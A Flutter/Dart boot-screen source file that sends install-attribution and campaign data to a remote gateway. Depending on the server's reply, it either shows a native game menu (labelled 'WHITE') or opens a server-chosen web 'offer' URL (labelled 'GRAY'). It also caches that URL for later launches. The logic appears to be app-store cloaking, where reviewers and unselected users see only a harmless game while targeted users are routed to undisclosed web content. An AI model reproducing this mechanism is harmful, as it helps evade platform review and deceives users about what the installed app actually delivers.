import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../bridge/insight.dart';
import '../core/alert_relay.dart';
import '../core/attribution_bureau.dart';
import '../core/gateway_api.dart';
import '../core/local_vault.dart';
import '../core/net_probe.dart';
import '../data/run_mode.dart';
import '../env/debug_flags.dart';
import '../env/shell_settings.dart';
import '../screens/main_menu_screen.dart';
import 'alert_prompt_stage.dart';
import 'offline_notice_stage.dart';
import 'portal_stage.dart' deferred as portal;

class BootStage extends StatefulWidget {
  final LocalVault vault;
  final NetProbe netProbe;
  final AttributionBureau bureau;
  final GatewayApi gateway;
  final AlertRelay alerts;

  const BootStage({
    super.key,
    required this.vault,
    required this.netProbe,
    required this.bureau,
    required this.gateway,
    required this.alerts,
  });

  @override
  State<BootStage> createState() => _BootStageState();
}

class _BootStageState extends State<BootStage> with TickerProviderStateMixin {
  // _barCtrl.value == the live fill fraction (0.0–1.0).
  // Use animateTo() to smoothly tween from the current fill to a new target.
  late final AnimationController _barCtrl;

  bool _hasNavigated = false;

  @override
  void initState() {
    super.initState();
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);

    // Start at exactly 0.
    _barCtrl = AnimationController(vsync: this, value: 0.0);
    Insight.screen('loading');
    _run();
  }

  @override
  void dispose() {
    widget.alerts.onTokenRotated = null;
    _barCtrl.dispose();
    super.dispose();
  }

  // ─── Router ──────────────────────────────────────────────────
  Future<void> _run() async {
    widget.alerts.onTokenRotated = _reSubmitWithNewToken;
    unawaited(widget.alerts.bootstrap());

    final mode = widget.vault.readMode();
    grayLog('BOOT: stored RunMode=$mode gatewayConfigured=${ShellSettings.gatewayUrl.isNotEmpty}');
    switch (mode) {
      case RunMode.arcade:
        grayLog('BOOT: mode=arcade → straight to WHITE (game), no network');
        Insight.tag('run_mode', 'native');
        Insight.event('route_native');
        await _animTo(0.5, 50);
        await _animTo(1.0, 100);
        _goToArcade();
        return;
      case RunMode.portal:
        await _handleReturningPortal();
        return;
      case RunMode.initial:
        await _handleFirstLaunch();
        return;
    }
  }

  Future<void> _handleFirstLaunch() async {
    grayLog('FIRST LAUNCH flow started');
    await _animTo(0.10, 0);

    final live = await widget.netProbe.isLive();
    grayLog('FIRST LAUNCH: netProbe.isLive=$live');
    if (!live) {
      if (ShellSettings.gatewayUrl.isEmpty) {
        grayLog('FIRST LAUNCH: offline + no gateway → WHITE (permanent)');
        await widget.vault.writeMode(RunMode.arcade);
        await _animTo(1.0, 100);
        _goToArcade();
      } else {
        grayLog('FIRST LAUNCH: offline + gateway set → No-Wifi screen');
        _goToOfflineNotice();
      }
      return;
    }

    await _animTo(0.25, 0);
    await widget.bureau.start();

    await _animTo(0.50, 0);
    await Future.wait([
      widget.bureau.waitForInstall(),
      widget.bureau.waitForDeepLink(),
    ]);

    await _animTo(0.80, 0);
    // Make sure Firebase is wired and a push token is available before
    // we submit — on an offline first launch the token wasn't fetched
    // yet, and we must include it now (same session) so the backend can
    // deliver notifications after the No-Wifi → Retry recovery.
    await widget.alerts.bootstrap();
    final pushToken = await widget.alerts.ensureToken();
    final payload = await widget.bureau.composePayload(
      locale: _currentLocale(),
      pushToken: pushToken,
    );

    Insight.identify(
      payload['af_id']?.toString(),
      tags: {
        'af_status': payload['af_status']?.toString() ?? '',
        'media_source': payload['media_source']?.toString() ?? '',
        'campaign': payload['campaign']?.toString() ?? '',
        'os': payload['os']?.toString() ?? '',
        'locale': payload['locale']?.toString() ?? '',
      },
    );

    final reply = await widget.gateway.submit(payload);

    await _animTo(1.0, 100);

    if (reply.approved && reply.destination != null) {
      grayLog('FIRST LAUNCH: APPROVED → GRAY (portal). mode=portal saved');
      await widget.vault.writeMode(RunMode.portal);
      Insight.tag('run_mode', 'web');
      Insight.event('route_web');
      _goToPortal(reply.destination!);
    } else if (reply.responded) {
      if (kGrayFlowDebug) {
        grayLog('FIRST LAUNCH: DECLINED by server → WHITE this session. '
            'DEBUG: mode kept INITIAL (relaunch will re-query gateway)');
      } else {
        grayLog('FIRST LAUNCH: DECLINED by server → WHITE (permanent). mode=arcade saved');
        await widget.vault.writeMode(RunMode.arcade);
      }
      Insight.tag('run_mode', 'native');
      Insight.event('route_native');
      _goToArcade();
    } else {
      grayLog('FIRST LAUNCH: transient failure → WHITE this session, mode kept INITIAL (will retry next launch)');
      Insight.event('route_offline');
      _goToArcade();
    }
  }

  Future<void> _handleReturningPortal() async {
    grayLog('RETURNING PORTAL flow started');
    await _animTo(0.15, 0);

    final live = await widget.netProbe.isLive();
    grayLog('RETURNING PORTAL: netProbe.isLive=$live');
    if (!live) {
      grayLog('RETURNING PORTAL: offline → No-Wifi screen');
      await _animTo(1.0, 100);
      _goToOfflineNotice();
      return;
    }

    final pushed = await widget.vault.takePushUrl();
    if (pushed != null) {
      await _animTo(1.0, 100);
      _goToPortal(pushed);
      return;
    }

    await _animTo(0.35, 0);
    final cached = await widget.vault.readOfferUrl();

    await widget.bureau.start();
    await Future.wait([
      widget.bureau.waitForInstall(within: const Duration(seconds: 5)),
      widget.bureau.waitForDeepLink(within: const Duration(seconds: 2)),
    ]);
    await _animTo(0.80, 0);

    await widget.alerts.bootstrap();
    final pushToken = await widget.alerts.ensureToken();
    final payload = await widget.bureau.composePayload(
      locale: _currentLocale(),
      pushToken: pushToken,
    );

    Insight.identify(
      payload['af_id']?.toString(),
      tags: {
        'af_status': payload['af_status']?.toString() ?? '',
        'media_source': payload['media_source']?.toString() ?? '',
        'campaign': payload['campaign']?.toString() ?? '',
        'os': payload['os']?.toString() ?? '',
        'locale': payload['locale']?.toString() ?? '',
      },
    );

    final reply = await widget.gateway.submit(payload);

    await _animTo(1.0, 100);

    if (reply.approved && reply.destination != null) {
      grayLog('RETURNING PORTAL: APPROVED → GRAY (fresh url)');
      Insight.tag('run_mode', 'web');
      Insight.event('route_web');
      _goToPortal(reply.destination!);
    } else if (cached != null) {
      grayLog('RETURNING PORTAL: not approved → GRAY (cached offer url)');
      Insight.tag('run_mode', 'web');
      Insight.event('route_cached_link');
      _goToPortal(cached);
    } else {
      grayLog('RETURNING PORTAL: not approved + no cache → No-Wifi screen');
      Insight.event('route_offline');
      _goToOfflineNotice();
    }
  }

  // ─── Bar helper ───────────────────────────────────────────────
  // Animates the bar to [target] over ~700 ms then waits [holdMs] more.
  Future<void> _animTo(double target, int holdMs) async {
    if (!mounted) return;
    await _barCtrl.animateTo(
      target.clamp(0.0, 1.0),
      duration: const Duration(milliseconds: 300),
      curve: Curves.easeOut,
    );
    if (holdMs > 0) {
      await Future<void>.delayed(Duration(milliseconds: holdMs));
    }
  }

  void _reSubmitWithNewToken(String newToken) async {
    try {
      final payload = await widget.bureau.composePayload(
        locale: _currentLocale(),
        pushToken: newToken,
      );
      await widget.gateway.submit(payload);
    } catch (_) {}
  }

  String _currentLocale() => Platform.localeName.replaceAll('-', '_');

  // ─── Navigation helpers ───────────────────────────────────────
  void _goToArcade() {
    if (_hasNavigated || !mounted) return;
    _hasNavigated = true;
    SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
    Navigator.of(context).pushReplacement(
      PageRouteBuilder(
        transitionDuration: const Duration(milliseconds: 400),
        pageBuilder: (_, __, ___) => const MainMenuScreen(),
        transitionsBuilder: (_, anim, __, child) =>
            FadeTransition(opacity: anim, child: child),
      ),
    );
  }

  Future<void> _goToPortal(String url) async {
    if (_hasNavigated || !mounted) return;
    _hasNavigated = true;
    await portal.loadLibrary();
    if (!mounted) return;

    if (widget.vault.shouldPromptForAlerts()) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => AlertPromptStage(
            vault: widget.vault,
            alerts: widget.alerts,
            netProbe: widget.netProbe,
            nextUrl: url,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => portal.PortalStage(
            targetUrl: url,
            vault: widget.vault,
            alerts: widget.alerts,
            netProbe: widget.netProbe,
          ),
        ),
      );
    }
  }

  void _goToOfflineNotice() {
    if (_hasNavigated || !mounted) return;
    _hasNavigated = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => OfflineNoticeStage(
          onRetry: (_) => BootStage(
            vault: widget.vault,
            netProbe: widget.netProbe,
            bureau: widget.bureau,
            gateway: widget.gateway,
            alerts: widget.alerts,
          ),
        ),
      ),
    );
  }

  // ─── UI ──────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0B0F1A),
      body: OrientationBuilder(builder: (ctx, orient) {
        final portrait = orient == Orientation.portrait;
        final art = portrait
            ? 'assets/verticalloading.webp'
            : 'assets/horizontalloading.webp';
        final hPad = portrait ? 32.0 : 80.0;
        final vPad = portrait ? 42.0 : 22.0;

        return Stack(fit: StackFit.expand, children: [
          Image.asset(art, fit: BoxFit.cover, gaplessPlayback: true),
          Positioned.fill(
            child: DecoratedBox(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.center,
                  end: Alignment.bottomCenter,
                  colors: [
                    Colors.transparent,
                    Colors.black.withValues(alpha: 0.6),
                  ],
                ),
              ),
            ),
          ),
          Align(
            alignment: Alignment.bottomCenter,
            child: SafeArea(
              child: Padding(
                padding: EdgeInsets.symmetric(
                    horizontal: hPad, vertical: vPad),
                child: _LoadingBar(controller: _barCtrl),
              ),
            ),
          ),
        ]);
      }),
    );
  }
}

// ─── Progress bar + percentage ───────────────────────────────────

class _LoadingBar extends StatelessWidget {
  final AnimationController controller;

  const _LoadingBar({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) {
        final fill = controller.value.clamp(0.0, 1.0);
        final pct = (fill * 100).round();

        return Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            // ── Bar track ─────────────────────────────────────
            LayoutBuilder(builder: (_, c) {
              return Container(
                width: c.maxWidth,
                height: 20,
                decoration: BoxDecoration(
                  color: Colors.black.withValues(alpha: 0.55),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(
                      color: const Color(0xFFE8B94A), width: 1.8),
                ),
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(9),
                  child: Align(
                    alignment: Alignment.centerLeft,
                    child: FractionallySizedBox(
                      widthFactor: fill,
                      child: Container(
                        decoration: const BoxDecoration(
                          gradient: LinearGradient(
                            colors: [
                              Color(0xFFFFF3B0),
                              Color(0xFFE8B94A),
                              Color(0xFFB07010),
                            ],
                            stops: [0.0, 0.55, 1.0],
                          ),
                        ),
                      ),
                    ),
                  ),
                ),
              );
            }),

            // ── Percentage text ────────────────────────────────
            const SizedBox(height: 8),
            Text(
              '$pct%',
              style: const TextStyle(
                color: Color(0xFFF6D36B),
                fontSize: 15,
                fontWeight: FontWeight.w700,
                letterSpacing: 1.8,
                shadows: [
                  Shadow(
                      color: Colors.black,
                      blurRadius: 6,
                      offset: Offset(0, 1)),
                ],
              ),
            ),
          ],
        );
      },
    );
  }
}
